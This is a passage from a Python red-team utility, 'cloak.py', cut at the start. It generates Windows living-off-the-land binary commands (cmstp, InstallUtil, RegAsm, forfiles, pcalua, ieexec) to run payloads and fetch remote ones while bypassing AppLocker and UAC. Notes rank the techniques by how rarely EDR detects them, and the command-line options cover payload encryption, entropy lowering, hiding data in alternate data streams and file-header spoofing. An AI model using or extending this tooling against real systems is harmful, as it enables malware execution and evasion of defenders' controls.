        "os":   "⚠ Requires Internet Explorer — removed in Win 11. Works on Win 10 and earlier",
        "note": "Rarely monitored when present, but IE removal makes this increasingly rare",
        "types": ["*"],
        "cmds": {
            "*": lambda f,u,a: [
                f'ieexec.exe {u or "http://host/payload.exe"}',
            ],
        },
    },
    "cmstp": {
        "desc": "Execute INF file — UAC bypass + AppLocker bypass",
        "os":   "All Windows versions",
        "note": "⚠ UAC bypass variant patched in some builds. Execution still works without UAC bypass",
        "types": [".inf"],
        "cmds": {
            ".inf": lambda f,u,a: [
                f'cmstp.exe /s /ns {f}',
                f'cmstp.exe /au {f}',
            ],
        },
    },
    "cscript": {
        "desc": "Execute script files",
        "os":   "All Windows versions",
        "note": "Windows Script Host may be disabled via GPO in hardened environments",
        "types": [".vbs", ".js", ".wsf"],
        "cmds": {
            ".vbs": lambda f,u,a: [f'cscript.exe //nologo {f}'],
            ".js":  lambda f,u,a: [f'cscript.exe //nologo {f}'],
            ".wsf": lambda f,u,a: [f'cscript.exe //nologo {f}'],
        },
    },
    "wscript": {
        "desc": "Execute script files (GUI host)",
        "os":   "All Windows versions",
        "note": "Windows Script Host may be disabled via GPO in hardened environments",
        "types": [".vbs", ".js", ".wsf"],
        "cmds": {
            ".vbs": lambda f,u,a: [f'wscript.exe //nologo {f}'],
            ".js":  lambda f,u,a: [f'wscript.exe //nologo {f}'],
            ".wsf": lambda f,u,a: [f'wscript.exe //nologo {f}'],
        },
    },
    "installutil": {
        "desc": "Execute .NET assembly — bypasses AppLocker",
        "os":   "All Windows versions with .NET Framework",
        "note": "Assembly must implement System.Configuration.Install.Installer",
        "types": [".exe", ".dll"],
        "cmds": {
            ".exe": lambda f,u,a: [
                f'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U {f}',
                f'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U {f}',
            ],
            ".dll": lambda f,u,a: [
                f'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U {f}',
            ],
        },
    },
    "regasm": {
        "desc": "Execute .NET assembly via COM registration",
        "os":   "All Windows versions with .NET Framework",
        "note": "DLL must implement a COM-registerable class. Low detection rate",
        "types": [".dll"],
        "cmds": {
            ".dll": lambda f,u,a: [
                f'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe /U {f}',
                f'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe /U {f}',
            ],
        },
    },
    "regsvcs": {
        "desc": "Execute .NET DLL via COM+ Services",
        "os":   "All Windows versions with .NET Framework",
        "note": "Similar to regasm — requires COM+ compatible DLL",
        "types": [".dll"],
        "cmds": {
            ".dll": lambda f,u,a: [
                f'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe {f}',
            ],
        },
    },
    "forfiles": {
        "desc": "Execute command via file search — cmd.exe bypass",
        "os":   "All Windows versions",
        "note": "Good cmd.exe alternative when cmd is restricted. Low monitoring",
        "types": ["*"],
        "cmds": {
            "*": lambda f,u,a: [
                f'forfiles /p C:\\Windows\\System32 /m notepad.exe /c "{f}"',
                f'forfiles /p C:\\Windows\\System32 /m calc.exe /c "cmd /c {f}"',
            ],
        },
    },
    "pcalua": {
        "desc": "Execute via Program Compatibility Assistant",
        "os":   "All Windows versions",
        "note": "Very low detection — rarely in EDR rule sets. No network capability",
        "types": ["*"],
        "cmds": {
            "*": lambda f,u,a: [
                f'pcalua.exe -a {f}',
                f'pcalua.exe -a {f} -d C:\\Windows\\System32',
            ],
        },
    },
}

def _b64ps(s: str) -> str:
    """Base64-encode a string for PowerShell -enc flag (UTF-16LE)."""
    import base64
    return base64.b64encode(s.encode("utf-16-le")).decode()

def do_generate(args):
    """Interactive or flag-driven LOLBin command generator."""

    # ── Resolve file / URL / extension ────────────────────────────────────────
    file_path = args.lolbin_file or ""
    url       = args.lolbin_url  or ""
    extra_arg = args.lolbin_arg  or ""

    # Determine extension
    if file_path:
        ext = Path(file_path).suffix.lower() or "*"
    elif url:
        ext = Path(url.split("?")[0]).suffix.lower() or "*"
    else:
        ext = "*"

    # If no file given use a placeholder
    display_file = file_path or (Path(url.split("?")[0]).name if url else "payload")

    # ── Filter LOLBins that support this extension ─────────────────────────────
    compatible = {}
    for name, lb in LOLBINS.items():
        if "*" in lb["types"] or ext in lb["types"] or not ext or ext == "*":
            compatible[name] = lb

    if not compatible:
        raise ValueError(
            f"No LOLBins found for extension '{ext}'. "
            f"Try one of: {', '.join(sorted({t for lb in LOLBINS.values() for t in lb['types']}))}"
        )

    # ── Interactive selection or --lolbin flag ─────────────────────────────────
    chosen_name = args.lolbin

    if not chosen_name:
        print()
        print(magenta("  ┌─────────────────────────────────────────────┐"))
        print(magenta("  │           LOLBin Generator                  │"))
        print(magenta(f"  │  Extension : {ext:<32}│"))
        print(magenta("  ├─────────────────────────────────────────────┤"))
        names = sorted(compatible.keys())
        for i, name in enumerate(names, 1):
            desc = compatible[name]["desc"]
            print(magenta(f"  │  [{i:>2}] {name:<14} {desc[:26]:<26}│"))
        print(magenta("  └─────────────────────────────────────────────┘"))
        try:
            raw = input("  Select LOLBin [#]: ").strip()
            idx = int(raw) - 1
            if idx < 0 or idx >= len(names):
                raise ValueError
            chosen_name = names[idx]
        except (ValueError, EOFError):
            raise ValueError("Invalid selection.")

    if chosen_name not in LOLBINS:
        raise ValueError(f"Unknown LOLBin '{chosen_name}'. Available: {list(LOLBINS.keys())}")

    lb   = LOLBINS[chosen_name]
    cmds_map = lb["cmds"]

    # Pick the right command set for this extension
    if ext in cmds_map:
        cmd_fn = cmds_map[ext]
    elif "*" in cmds_map:
        cmd_fn = cmds_map["*"]
    else:
        # Fall back to first available
        cmd_fn = list(cmds_map.values())[0]

    commands = cmd_fn(display_file, url, extra_arg)

    # ── Print results ──────────────────────────────────────────────────────────
    print()
    print(cyan(f"  LOLBin    : {chosen_name}"))
    print(cyan(f"  Purpose   : {lb['desc']}"))
    os_str = lb.get('os', 'All Windows versions')
    note_str = lb.get('note', '')
    if '⚠' in os_str:
        print(red(f"  OS        : {os_str}"))
    else:
        print(cyan(f"  OS        : {os_str}"))
    if note_str:
        print(yellow(f"  Note      : {note_str}"))
    if file_path: print(cyan(f"  File      : {file_path}"))
    if url:       print(cyan(f"  URL       : {url}"))
    print()
    print(yellow("  ┌─────────────────────────────────────────────────────────────┐"))
    print(yellow("  │                     Generated Commands                      │"))
    print(yellow("  └─────────────────────────────────────────────────────────────┘"))
    for i, cmd in enumerate(commands, 1):
        print()
        print(green(f"  [{i}] ") + bold(cmd))

    # Write to output file if requested
    if args.output:
        out_lines = [f"# LOLBin: {chosen_name}", f"# {lb['desc']}"]
        if file_path: out_lines.append(f"# File : {file_path}")
        if url:       out_lines.append(f"# URL  : {url}")
        out_lines.append("")
        for i, cmd in enumerate(commands, 1):
            out_lines.append(f"# Variant {i}")
            out_lines.append(cmd)
            out_lines.append("")
        write_file(args.output, "\n".join(out_lines).encode())
        ok(f"Commands saved → {args.output}")

    print()


# ═══════════════════════════════════════════════════════════════════════════════
#  ARGUMENT PARSER
# ═══════════════════════════════════════════════════════════════════════════════

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="cloak.py",
        description="Red Team File Utility — encode, ADS, entropy, spoof, inspect, generate LOLBin commands.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  info     Inspect a file: size, entropy, header fingerprint, magic-byte match.
  util     Encode / ADS / entropy-pad / rename / spoof a file.

Examples:
  # Inspect (includes entropy score)
  python cloak.py info -c payload.exe --show-hashes

  # RC4 encode
  python cloak.py util -c payload.exe --encode

  # Lower entropy then encode
  python cloak.py util -c payload.exe --lower-entropy 6.0 --encode

  # Write to ADS (Windows only)
  python cloak.py util -c readme.txt --ads-write payload.enc --ads-stream hidden

  # Read from ADS
  python cloak.py util -c readme.txt --ads-read --ads-stream hidden -o recovered.bin

  # List ADS streams
  python cloak.py util -c readme.txt --ads-list

  # Delete ADS stream
  python cloak.py util -c readme.txt --ads-delete --ads-stream hidden

  # Rename extension and spoof header
  python cloak.py util -c file.bin --new-extension .pdf --spoof-header

  # Generate LOLBin commands interactively
  python cloak.py generate --lolbin-file payload.dll

  # Generate specific LOLBin with URL
  python cloak.py generate --lolbin regsvr32 --lolbin-file payload.sct --lolbin-url http://host/payload.sct

  # List all available LOLBins
  python cloak.py generate --list
        """
    )

    p.add_argument("mode", choices=["info", "util", "generate"],
                   help="Operation mode")
    p.add_argument("--carrier",       "-c", help="Input file")
    p.add_argument("--output",        "-o", help="Output file path")


    # Encoding/Decoding (mutually exclusive)
    group = p.add_mutually_exclusive_group()
    group.add_argument("--encode",        "-e", action="store_true",
                      help="Show interactive encoding menu (includes RC4)")
    group.add_argument("--decode",        "-d", action="store_true",
                      help="Show interactive decoding menu (includes RC4)")

    # Entropy
    p.add_argument("--lower-entropy", type=float, default=None,
                   metavar="TARGET",
                   help="Lower entropy via null-byte interleaving to reach target "
                        "(e.g. 6.0). Applied before encoding. Marker embedded for recovery.")
    p.add_argument("--strip-padding", type=int, default=None,
                   metavar="INTERVAL",
                   help="Reverse null-byte padding. Pass the interval printed during "
                        "--lower-entropy (e.g. --strip-padding 2).")

    # Extension / header
    p.add_argument("--new-extension", "-n",
                   help="Replace all extensions (e.g. .pdf)")
    p.add_argument("--add-extension", "-a",
                   help="Append to filename (e.g. .bak)")
    p.add_argument("--spoof-header",  "-x", action="store_true",
                   help="Overwrite first bytes with magic bytes for target extension")

    # Hashes / quiet
    p.add_argument("--show-hashes",   "-H", action="store_true",
                   help="Display MD5 / SHA1 / SHA256")
    p.add_argument("--quiet",         "-q", action="store_true",
                   help="Suppress banner")

    # ADS (Windows only)
    ads = p.add_argument_group("ADS — Alternate Data Streams (Windows/NTFS only)")
    ads.add_argument("--ads-write",  metavar="PAYLOAD",
                     help="Write PAYLOAD into an ADS on --carrier")
    ads.add_argument("--ads-read",   action="store_true",
                     help="Read ADS stream from --carrier to --output")
    ads.add_argument("--ads-list",   action="store_true",
                     help="List all ADS streams on --carrier")
    ads.add_argument("--ads-delete", action="store_true",
                     help="Delete ADS stream from --carrier")
    ads.add_argument("--ads-stream", metavar="NAME",
                     help="Stream name (e.g. 'hidden'  →  file.txt:hidden)")

    # LOLBin generate args
    lol = p.add_argument_group("generate — LOLBin command generator")
    lol.add_argument("--lolbin",      metavar="NAME",
                     help="LOLBin to use (e.g. regsvr32, certutil, mshta). "
                          "Interactive menu if omitted.")
    lol.add_argument("--lolbin-file", metavar="PATH",
                     help="Local payload file path to embed in commands")
    lol.add_argument("--lolbin-url",  metavar="URL",
                     help="Remote URL to embed in download cradles")
    lol.add_argument("--lolbin-arg",  metavar="ARG",
                     help="Extra argument (e.g. DLL export name for rundll32)")
    lol.add_argument("--list",        action="store_true",
                     help="List all available LOLBins and exit")

    return p

# ═══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    if hasattr(sys.stdout, 'reconfigure'):
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    if hasattr(sys.stderr, 'reconfigure'):
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')

    parser = build_parser()
    args   = parser.parse_args()

    banner(args.quiet)

    try:
        mode = args.mode.lower()

        # ── INFO ───────────────────────────────────────────────────────────────
        if mode == "info":
            if not args.carrier: parser.error("--carrier is required for info mode.")
            do_info(args)
            if args.encode:
                encoding_menu(args.carrier)

        # ── UTIL ───────────────────────────────────────────────────────────────
        elif mode == "util":
            if not args.carrier: parser.error("--carrier is required for util mode.")
            do_util(args)

        # ── GENERATE ───────────────────────────────────────────────────────────
        elif mode == "generate":
            if args.list:
                print()
                print(cyan("  Available LOLBins:"))
                print()
                for name, lb in sorted(LOLBINS.items()):
                    types = ", ".join(lb["types"])
                    print(f"  {green(name):<30} {lb['desc']}")
                    print(cyan(f"    os    : {lb.get('os', 'All Windows versions')}"))
                    print(yellow(f"    note  : {lb.get('note', '')}"))
                    print(grey(f"    types : {types}"))
                    print()
                print()
            else:
                do_generate(args)

    except (FileNotFoundError, ValueError, OSError) as exc:
        err(str(exc))
        sys.exit(1)
    except KeyboardInterrupt:
        print()
        warn("Interrupted.")
        sys.exit(0)

if __name__ == "__main__":
    main()